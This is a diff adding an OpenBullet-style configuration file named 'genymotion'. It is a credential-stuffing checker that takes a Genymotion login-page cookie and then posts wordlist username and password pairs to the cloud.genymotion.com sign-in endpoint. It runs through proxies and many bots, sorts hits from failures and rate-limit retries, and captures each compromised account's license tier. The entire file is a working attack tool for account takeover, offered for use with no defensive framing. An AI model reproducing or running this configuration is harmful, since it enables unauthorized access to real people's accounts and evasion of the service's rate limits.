@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "genymotion",
+  "SuggestedBots": 50,
+  "LastModified": "2018-06-13T08:17:59.7544068+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.genymotion.com/account/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#COOKIE PARSE "<COOKIES(__cfduid)>" LR "" "" Recursive=FALSE -> VAR "BLACK PANTHER" "" "" 
+#POST REQUEST POST "https://cloud.genymotion.com/customer/signin/" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":true}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  COOKIE "__cfduid: <BLACK PANTHER>" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+#HELLO_WORLD KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+    KEY "Too many requests" 
+  KEYCHAIN Failure OR 
+    KEY "Bad username/email or bad password" 
+  KEYCHAIN Success OR 
+    KEY "username\": " 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Free - no license" 
+#LICENSE PARSE "<SOURCE>" LR "license_info\":" "\"," Recursive=FALSE -> CAP "License" "" "" 
+#ToS FUNCTION Constant "<BLACK PANTHER>" -> VAR "ToS" 
